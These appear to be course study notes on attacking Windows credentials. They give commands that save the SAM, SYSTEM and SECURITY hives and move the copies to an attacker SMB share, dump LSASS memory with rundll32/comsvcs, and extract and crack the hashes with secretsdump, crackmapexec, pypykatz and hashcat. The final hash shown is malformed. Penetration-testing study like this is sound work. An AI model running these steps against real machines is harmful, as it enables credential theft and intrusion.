# Attacking SAM

- hklm\sam : Contains the hashes associated with local account passwords. 
We will need the hashes so that we can crack them offline and get the user account passwords.

- hklm\system : Contains the system bootkey, which is used to encrypt the SAM database. 
We will need the bootkey to decrypt the SAM database.

- hklm\security : Contains cached credentials for domain accounts. 
We may benefit from having this on a domain-joined Windows target.

When a user attempts to log on locally to the system by entering a username and password in the login dialog box, 
the login process invokes the LSA, which passes the user's credentials to the `Security Accounts Manager (SAM)`, 
which manages the account information stored in the local SAM database. 

IN addition to getting coppies of the SAM database to dump and crack hashes, we will also benefit from targeting 
LSASS. As discussed in the `Credential Storage` section of this module, LSASS is a critical service that plays a 
central role in credential management and the authentication process in all Windows operating systems.

Upon initial login, LSASS will:

	- Cache credentials locally in memory
	- Create Access Tokens
	- Enforce security policies
	- Write to Windows security log

## Using Reg.exe to save a Copy of Registry Hives

```
C:\WINDOWS\System32> reg.exe save hklm\sam C:\sam.save
C:\WINDOWS\System32> reg.exe save hklm\system C:\system.save
C:\WINDOWS\System32> reg.exe save hklm\security C:\security.save
```

### Creating a share with smbserver.py

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/MrBob/Documents
```

```
C:\> move sam.save \\10.10.15.16\CompData
C:\> move system.save \\10.10.15.16\CompData
C:\> move security.save \\10.10.15.16\CompData
```

```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -system system.save -security 
security.save LOCAL

sudo hashcat -m 1000 secrets.txt /usr/share/wordlists/rockyou.txt
```

## Remote Dumping & LSA Secrets Considerations

```bash
crackmapexec smb 10.129.42.198 --local-auth -u Bob -p p@ssw0rd123! --lsa
crackmapexec smb 10.129.42.198 --local-auth -u Bob -p p@ssw0rd123! --sam
```

# Dumping LSASS Process Memory

## Task Manager Method

> Task Manager -> Processes -> Local Security Authority Process -> Create Dump File

A file named `lsass.DMP` will appear and be saved in `C:\Users\user's directory\AppData\Local\Temp`

## Rundll32.exe & Comsvcs.dll Method

The Task manager is dependent on us having GUI.... We can use `Rundll32` and `Comsvcs` in order to perform this 
from PowerShell or CMD:

```
tasklist /svc in CMD OR Get-Process lsass in PowerShell
rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <lsass ID> C:\lsass.dmp full
```

MiniDump is `the MiniDumpWriteDump` function, being called to dump the LSASS process memory to a specified 
directory. Most modern AV tools recognize this as malicious and prevent the command from executing. 

We will need to consider ways to bypass or disable the AV tool we are facing. AV bypassing techniques are outside 
of the scope of this module.

If we are successful, however, we can proceed to transfer the file to our attack box and attempt to extract any 
credentials that may have been stored in LSASS memory.

## Running Pypykatz to Extract Credentials

Once we have the dump, we can use `pypykatz` to attempt extraction.

```bash
pypykatz lsa minidump /home/lemur/Documents/lsass.dump

sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
```

## WDIGEST

WINDIGEST is an older authentication protocol enabled by default in Windows XP, 8 and Windows Server 2003-2012. 

LSASS caches credentials used by WDIGEST in clear-text. This means if we find ourselves targeting a system with 
WDIGEST enabled, we will most likely see a password in the clear.

## MSV

`MSV` is an authentication package in Windows that LSA calls on to validate logon attempts against the SAM 
database. Pypykatz extracted the SID, the Username, the Domain/Hostname and even the NT & SHA1 password hashes 
associated with Bob's account logon session stored in LSASS Process memory. This will prove helpful in the final 
stage of our attack covered at the end of this section.

We have something called `Protected Users Group` as well. It can be read about in this Microsoft documentation: 
https://msrc-blog.microsoft.com/2014/06/05/an-overview-of-kb2871997/

## Kerberos

Kerberos is a network authentication protocol used by Active Directory in Windows Domain environments. 
Domain user accounts are granted tickets upon authentication with AD. This ticket is used to allow the user to 
access shared resources on the network that they have been granted access to without needing to type in their 
password each time. LSASS caches `passwords, ekeys, tickets and pins` associated with Kerberos. It's possible to 
extract these from LSASS process memory and use them to access other systems joined to the domain.

## DPAPI

The Data Protection Application Programing Interface (DPAPI) is a set of APIs in Windows operating systems used to 
encrypt and decrypt DPAPI data blobs on a per-user bnasis for Windows OS features and various third-party 
applications. Here are just a few examples of applications that use DPAPI and what they're used for:

- Internet Explorer : Password form auto-completion
- Google Chrome : Password form auto-completion
- Outlook : Passwords for email accounts
- Remote Desktop Connection : Saved credentials for remote connections
- Credential Manager : Saved credentials for accessing shared resources, joining wireless networks, VPNs and 
more..

Mimikatz and Pypykatz can extract the DPAPI masterkey for the logged-on user whose data is present in LSASS 
process memory. This masterkey can then be used to decrypt the secrets associated with each of the applications 
using DPAPI and result in the capturing of credentials for various accounts. DPAPI attack techniques are covered 
in greater detail in the Windows Privilege Escalation module.

## Cracking the NT hash with Hashcat

```bash
sudo hashcat -m 1000 4783jfhh3854773983f00sf0 /usr/share/wordlists/rockyou.txt
```
